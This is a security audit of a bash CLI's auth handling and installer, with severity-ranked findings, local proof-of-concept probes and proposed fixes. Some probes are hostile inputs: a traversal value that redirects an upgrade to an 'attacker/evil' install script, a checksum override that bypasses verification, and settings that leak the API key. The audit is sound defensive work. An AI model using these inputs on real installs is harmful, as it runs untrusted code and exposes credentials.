# Security audit — auth handling and the installer

Ticket: [Audit security of auth handling and the installer](https://github.com/objctp/runpod-cli/issues/8)
Map: [Wayfinder map — publish runpod-cli v1.0 aligned and audited](https://github.com/objctp/runpod-cli/issues/1)
Date: 2026-08-16 · Commit audited: `4cf2e69` · Method: repo `shell-security` skill
(`.opencode/skills/shell-security/scripts/security-audit.sh` over `bin/`, `lib/`,
`commands/`, `install.sh`) plus targeted code reading and local/read-only probes.
Findings only — no source was modified. Live probes were GETs only.

The repo-root `.env` is real; nothing below prints its contents. Probe tokens are
dummies except where a live GET is explicitly noted.

Severity: **High** = exploitable path to running attacker code or losing
credentials · **Moderate** = credential exposure or data loss under a realistic
condition · **Low** = defence-in-depth or hygiene.

---

## High

### H1 — `--version` is unvalidated and redirects install/upgrade to an arbitrary repo, defeating the checksum gate

`commands/upgrade.sh:44,46` · `install.sh:99,103,195,197`

`--version` is interpolated straight into a raw.githubusercontent.com /
github.com path. curl normalises `..` segments in the path, so a crafted value
escapes the pinned `objctp/runpod-cli` prefix. Confirmed locally:

```
$ curl -s -o /dev/null -w '%{url_effective}\n' \
    'http://127.0.0.1:1/objctp/runpod-cli/v/../../../attacker/evil/main/install.sh'
http://127.0.0.1:1/attacker/evil/main/install.sh

$ curl -s -o /dev/null -w '%{url_effective}\n' \
    'http://127.0.0.1:1/objctp/runpod-cli/releases/download/v/../../../../../attacker/evil/x.tar.gz'
http://127.0.0.1:1/attacker/evil/x.tar.gz
```

So `rp upgrade --version '/../../../attacker/evil/main'` downloads a third
party's `install.sh` and runs it with `bash` (`commands/upgrade.sh:59`), a flow
that goes on to `sudo ln -sf` into `/usr/local/bin`. In `install.sh` the same
trick moves *both* the tarball URL and the `SHA256SUMS` URL to the attacker's
release, so the integrity check compares an attacker tarball against attacker
sums and passes — the checksum gate provides no protection at all against this
input.

The value normally comes from the user's own hand, which bounds the everyday
risk; it stops being bounded the moment the version is a variable (CI, a wrapper
script, a pasted one-liner, `rp upgrade --version "$TAG"`).

Fix — validate before use, in both places:

```bash
# commands/upgrade.sh, after ver_arg="$(rp::args_get version)"
[[ -z "$ver_arg" || "$ver_arg" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.]+)?$ ]] ||
  rp::usage "invalid --version '$ver_arg' (expected x.y.z)"

# install.sh, in the arg loop
[[ "$version" =~ ^v?[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.]+)?$ ]] ||
  rp_inst_die "invalid --version: $version"
```

Belt and braces: add `--path-as-is` to the two installer `curl` calls so path
normalisation cannot be used at all.

### H2 — `RP_CHECKSUM` disables the installer's only integrity check and executes arbitrary argv

`install.sh:86-96,200-206`

The checksum command is resolved from the environment and then executed:

```bash
ck_str="$(rp_inst_checksum_cmd)"   # honours $RP_CHECKSUM verbatim
local -a ck=(${ck_str})
(cd "$_rp_inst_tmp" && "${ck[@]}" -c SHA256SUMS >/dev/null 2>&1) || die
```

Confirmed by sourcing the installer and calling the function:

```
RP_CHECKSUM='true'            -> resolved checksum cmd: [true]
RP_CHECKSUM='echo pwned-argv' -> resolved checksum cmd: [echo pwned-argv]
```

`true -c SHA256SUMS` exits 0, so `curl … | RP_CHECKSUM=true bash` installs
unverified code silently, and the variable is also a general argv-execution seam
inside the install flow. The same class of test-only seam applies to
`RP_LATEST_TAG` (skips version resolution), `RP_UNAME` and `RP_BASH_MAJOR`
(defeats the "rp needs Bash 5+" refusal). None are documented in `README.md` or
`CONTRIBUTING.md`, so they read as production configuration to anyone who finds
them.

Fix — gate every probe override behind one explicit test flag, e.g.

```bash
_rp_inst_testing() { [[ -n "${RP_INSTALL_TEST:-}" ]]; }
rp_inst_checksum_cmd() {
  if _rp_inst_testing && [[ -n "${RP_CHECKSUM:-}" ]]; then printf '%s\n' "$RP_CHECKSUM"
  elif command -v sha256sum …
```

or drop the env seam and let the unit tests stub `sha256sum` on `PATH`.

---

## Moderate

### M1 — request bodies, including the registry password, reach `jq` through argv and are visible in `ps`

`lib/json.sh:6,34,63` · `lib/graphql.sh:11` · caller `commands/registry.sh:61`

`lib/transport.sh:36-40` states the intent plainly: argv is visible in `ps`, so
the auth header and body travel through temp files — "on `rp registry create`, a
registry password" is called out by name. That holds for curl, but the body is
assembled one step earlier by `rp::json_obj` / `_json_merge`, which pass values
*and the whole accumulating object* through `jq --argjson`:

```bash
_json_merge() { jq -c -n --argjson a "$1" --argjson b "$2" '$a * $b'; }
obj="$(jq -c -n --argjson cur "$obj" --arg k "$k" --argjson v "$v" '$cur + {($k): $v}')"
```

Confirmed ps-visible:

```
$ jq -n --argjson v '"SEKRET_PW_PROBE"' 'reduce range(0;40000000) as $i (0;.+$i)' &
$ ps -o args= -p $!
jq -n --argjson v "SEKRET_PW_PROBE" reduce range(0;40000000) as $i (0; .+$i)
```

The window is short (one jq process per key) but the mitigation the code went out
of its way to build is undone before curl is ever reached. `ps` shows other
users' argv on default Linux, so on a shared host this is capturable. Also
affects `--env K=V` secrets (`lib/json.sh:63`) and GraphQL variables — though for
those the value is already in the user's own command line, so the marginal
exposure is nil. The prompted registry password is the one secret the CLI itself
obtains, and therefore the one that matters.

Fix — keep values off argv in the builder, reusing the existing 0600 `_mktemp`
discipline:

```bash
_mktemp vfile; printf '%s' "$v" >"$vfile"
obj="$(jq -c -n --argjson cur "$obj" --arg k "$k" --slurpfile v "$vfile" '$cur + {($k): $v[0]}')"
```

Or, minimally, special-case the password path in `_registry_create` so only that
value is piped rather than passed.

### M2 — a group/world-writable `.env` is warned about as "readable", then executed

`bin/rp:24-29` · `lib/common.sh:73-88`

`.env` is *sourced*, so anything in it runs as shell code on every `rp`
invocation. The guard's mask (`8#$perm & 077`) does catch write bits, but the
message only says "group/world-readable … it holds your API key", and rp
continues regardless. Confirmed with a mode-666 `.env` carrying a command:

```
note: …/.env is group/world-readable (mode 666); tighten with 'chmod 600 …'
MARKER: .env code executed
```

A writable `.env` is not a disclosure risk, it is arbitrary code execution as the
invoking user — and it can also set `PATH`, `RP_REST_BASE` (see M4) or
`RUNPOD_API_KEY`. Warning is the wrong verdict for that.

Fix — split the mask:

```bash
if ((8#$perm & 022)); then
  _auth "refusing to load $f: it is group/world-writable (mode $perm) and rp sources it as shell code; chmod 600 $f"
elif ((8#$perm & 044)); then
  rp::warn "note: $f is group/world-readable …"
fi
```

Related gap: `$RUNPOD_API_KEY_FILE` gets **no** permission check at all
(`lib/auth.sh:18-21`), whilst `.env` gets one. `_warn_if_world_readable` is
called from exactly one place (`bin/rp:25`); apply it to the key file too.

### M3 — `.env` silently overrides an exported `RUNPOD_API_KEY` and pre-empts `RUNPOD_API_KEY_FILE`

`bin/rp:24-29` · `lib/auth.sh:15-25`

`set -a; . .env` assigns unconditionally, so the file wins over the process
environment. Confirmed:

```
exported RUNPOD_API_KEY=KEY_FROM_ENV,  .env says KEY_FROM_DOTENV -> effective key = KEY_FROM_DOTENV
RUNPOD_API_KEY_FILE=<file with KEY_FROM_FILE>, .env present      -> effective key = KEY_FROM_DOTENV
```

The documented precedence in `lib/auth.sh` ("two adapters … `RUNPOD_API_KEY`,
`RUNPOD_API_KEY_FILE`") is inverted in practice: a stale `.env` left in the
install tree silently beats a deliberately exported key and silently disables a
mounted-secret setup, so requests can go to the wrong account with no signal.
This is also what makes M4 reachable from a file rather than only from the
environment.

Fix — let the environment win, e.g. source `.env` into a subshell and export only
the keys that are currently unset, or assign with `${VAR:=…}` semantics; at
minimum document that `.env` takes precedence and skip it when `RUNPOD_API_KEY`
or `RUNPOD_API_KEY_FILE` is already set.

### M4 — no scheme guard on the plane base URLs: the Bearer token will go out over cleartext HTTP

`lib/transport.sh:15-22` · `lib/common.sh:14-16`

The three base URLs are env-overridable by design (staging, pinning) but nothing
requires `https://`. Confirmed live against a local socket:

```
RP_REST_BASE=http://127.0.0.1:8123/v2 ./bin/rp pod list
# captured curl argv:
curl -sSL --connect-timeout 15 --max-time 120 -X GET -H @/…/tmp.uqK73W20 \
     -H Content-Type: application/json http://127.0.0.1:8123/v2/pods -o /…/tmp.ukhvAZxd -w %{http_code}
# the header file it points at (mode 0600) held: Authorization: Bearer <real key>
```

A real `Authorization: Bearer` header was sent to a plain-HTTP listener. Combined
with M2/M3 (a sourced `.env` that outranks the environment), a one-line `.env`
edit is a credential-exfiltration primitive. `-sSL` also follows redirects with
no protocol restriction.

Fix:

```bash
# lib/transport.sh, in _rp_plane_base or once at startup
[[ "$base" == https://* || -n "${RP_ALLOW_INSECURE:-}" ]] ||
  rp::die "refusing to send credentials to a non-https base: $base (set RP_ALLOW_INSECURE=1 to override)"
```

and add `--proto '=https' --proto-redir '=https'` to the curl args in
`_curl_json`, `rp::api_stream`, and the two installer fetches.

### M5 — installing into a non-empty `RP_INSTALL_DIR` deletes whatever else is in it

`install.sh:214-227`

The old tree is moved aside, the new files are dropped in, then the backup is
`rm -rf`'d — with no check that the target was ever an rp install. Simulated with
the exact sequence from those lines:

```
target/ contained my-other-script.sh   ->   after install: bin/   (my-other-script.sh survived? NO)
```

So `RP_INSTALL_DIR=~/bin` (or `$HOME`) destroys unrelated files without a prompt.
Data loss rather than a leak, but silent.

Fix — refuse unless the target is absent, empty, or already contains `bin/rp`,
and reject `$HOME` and `/` outright:

```bash
if [[ -e "$RP_INSTALL_DIR" && ! -x "$RP_INSTALL_DIR/bin/rp" ]] && [[ -n "$(ls -A "$RP_INSTALL_DIR")" ]]; then
  rp_inst_die "$RP_INSTALL_DIR is not empty and does not look like an rp install; refusing to replace it"
fi
```

---

## Low

### L1 — a crafted resource name sources an arbitrary file

`bin/rp:117-119`. `. "$RP_ROOT/commands/$resource.sh"` with no validation of
`$resource`. Confirmed:

```
$ ./bin/rp '../../../../../tmp/rp_traversal_probe'
MARKER: out-of-tree file was sourced by bin/rp
command module '../../../../../tmp/rp_traversal_probe' missing rp::cmd_…
```

Whoever supplies argv could run bash directly, so this is bounded — it matters
only where a wrapper forwards an untrusted word. Fix:
`[[ "$resource" =~ ^[a-z][a-z0-9-]*$ ]] || rp::usage "unknown resource: '$resource'"`
before building the path.

### L2 — the API key is printed by xtrace

`lib/auth.sh:29-31`. Confirmed:

```
+ printf 'Authorization: Bearer %s\n' probe_key_not_real
```

Debugging a bash CLI with `bash -x rp …` (or `SHELLOPTS=xtrace`) is the natural
first move, and traces get pasted into bug reports. Fix — suppress tracing inside
the two credential functions; `local -` restores the option set on return and rp
already requires Bash 5:

```bash
rp::auth_token() { local -; set +x; … }
rp::auth_header() { local -; set +x; printf 'Authorization: Bearer %s\n' "$(rp::auth_token)"; }
```

### L3 — `~/.rp` inherits a loose umask

`install.sh:219`. `mkdir -p "$RP_INSTALL_DIR"` under `umask 000` yields mode 0777
(verified), letting any local user swap `~/.rp/bin/rp`, which
`/usr/local/bin/rp` then executes. Fix: `umask 022` near the top of `install.sh`.
Nit alongside it: use `ln -sfn` (`install.sh:234,237`) so an existing symlink to
a directory does not turn into `$RP_BINDIR/rp/rp`.

### L4 — `--jq` is an environment-read primitive (informational)

`commands/api.sh:95` · `lib/resource.sh:58,70`. `--jq 'env'` or
`--jq '$ENV.RUNPOD_API_KEY'` prints the credentials (verified). This is jq's own
semantics and the caller already owns the environment, so it is not an rp defect;
it is only a hazard where the filter comes from somewhere else. Worth one line in
the docs, not code.

### L5 — tarball extraction unhardened (defence-in-depth; already logged at #7)

`install.sh:212`. `tar -xzf` into a staging dir. GNU and BSD tar both strip
absolute paths and reject `..` members, but neither prevents a symlink-mediated
escape. Extraction happens *after* checksum verification, so an attacker able to
swap the tarball already controls the payload — hence Low here rather than
Moderate. The shipped 0.4.0 tarball is clean: 34 entries, no symlink, absolute or
`..` members, modes 0755/0644. Fix: gate on a listing first —

```bash
tar -tzf "$tarball" | grep -qE '^/|(^|/)\.\./' && rp_inst_die "refusing tarball with unsafe paths"
```

---

## Clean bill — audited and sound

- **The token never reaches argv.** `_curl_json` and `rp::api_stream` pass
  `-H @<file>` and `--data @<file>` (`lib/transport.sh:41-64,100-122`). Captured
  from a live call, curl's argv holds only temp-file paths; the header file is
  mode `0600` (mktemp's default, verified), is `rm -f`'d immediately after curl
  returns, and is registered with the INT/TERM/HUP/EXIT cleanup trap
  (`lib/common.sh:51-67`, `bin/rp:22`).
- **No leak surface in output.** No `set -x`, no `curl -v`/`--trace`, no
  `curl -k`/`--insecure`, and no logging of headers or request bodies anywhere in
  `bin/`, `lib/`, `commands/`. Error messages carry method, path, HTTP status and
  the API's own message only; a live `rp pod list` produced no token substring on
  stdout or stderr (verified). `rp api --body` never echoes the body.
- **`rp registry create` gets the password handling right otherwise**
  (`commands/registry.sh:47-63`): `read -rs` from `/dev/tty`, no echo, and an
  explicit warning when `--password` is used instead. Only the jq hop (M1)
  undermines it.
- **URL and query quoting is sound.** `rp::query_params` encodes values via jq's
  `@uri` and decodes back only `,` and `:` (`lib/http.sh:58-71`). Paths are always
  `/`-prefixed and appended to a fixed `…/v2` base, so a crafted path can neither
  change the host nor be read as a curl flag (`rp api GET '//evil.com/x'` stays on
  `api.runpod.io`).
- **S3 paths are safe.** Bucket, prefix and path are embedded in a single quoted
  `s3://…` argv element and credentials go to `aws` through the environment, never
  argv (`lib/s3.sh:10-62`). No `eval`, no shell interpolation; `--models` slugs
  must contain `/` and are passed quoted, and `--source` is `-d`-checked.
- **No dangerous primitives.** No `eval`; no dynamic `source` of a variable path
  beyond `.env` and `commands/<resource>.sh`; no destructive commands, fork bombs,
  `chmod 777`, system-file writes, or hardcoded credentials. The skill's detector
  reports every category clean across `bin/`, `lib/`, `commands/`, `install.sh`
  bar two false positives: `trap 'rm -rf "$_rp_inst_tmp"' EXIT` on an
  internally-generated `mktemp -d` path (safe by design), and a comment line
  matched by the dynamic-execution pattern.
- **`curl | bash` truncation is handled correctly.** Everything in `install.sh`
  lives in functions; the only top-level call is the final line guarded by
  `[[ "${BASH_SOURCE[0]:-$0}" == "${0}" ]]`. A dropped connection defines
  functions and runs nothing.
- **Checksum enforcement is real when it runs.** `shasum -a 256 -c` returns 1 on
  an empty, comment-only, or missing-file `SHA256SUMS` (all three verified), so a
  stripped or truncated sums file aborts the install rather than passing. The
  released `SHA256SUMS` names exactly the tarball.
- **`rp upgrade` does not pipe curl into bash** — it downloads the installer to a
  registered temp file and then executes it (`commands/upgrade.sh:52-59`).
- **Rollback works and sudo is minimal.** A failed file move restores the backup
  (`install.sh:220-226`); the single `sudo` is one `ln -sf` for the
  `$RP_BINDIR/rp` symlink, attempted unprivileged first
  (`install.sh:229-242`). `rm -f -- "$hdr" "$tmp" "${body_tmp:-}"` with an empty
  third operand is harmless (verified rc=0).

## Not in scope here

Triage of these findings belongs to the quality/consistency triage ticket. The
inherent limits of the `curl | bash` channel (no signature over `SHA256SUMS`, so
a GitHub-account or channel compromise defeats the checksum by construction) are
a signing decision, not a bug — worth a line in the release notes if signing is
ruled out for v1.0.
